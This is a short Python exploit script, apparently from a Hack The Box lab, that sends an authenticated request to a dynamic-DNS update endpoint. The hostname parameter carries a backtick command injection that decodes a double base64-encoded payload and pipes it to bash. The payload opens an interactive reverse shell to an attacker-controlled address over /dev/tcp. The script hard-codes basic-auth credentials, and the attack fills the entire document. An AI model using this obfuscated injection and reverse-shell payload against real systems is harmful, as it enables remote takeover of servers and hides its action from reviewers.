import requests

from requests.auth import HTTPBasicAuth
r = requests.get('http://10.10.14.244/nic/update?hostname=`echo "WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eE1ETXZPVGs1T1NBd1BpWXhKd289" | base64 -d | base64 -d |bash`"test.dynamicdns.htb&myip=10.10.14.103&offline=YES', verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print(r.text)
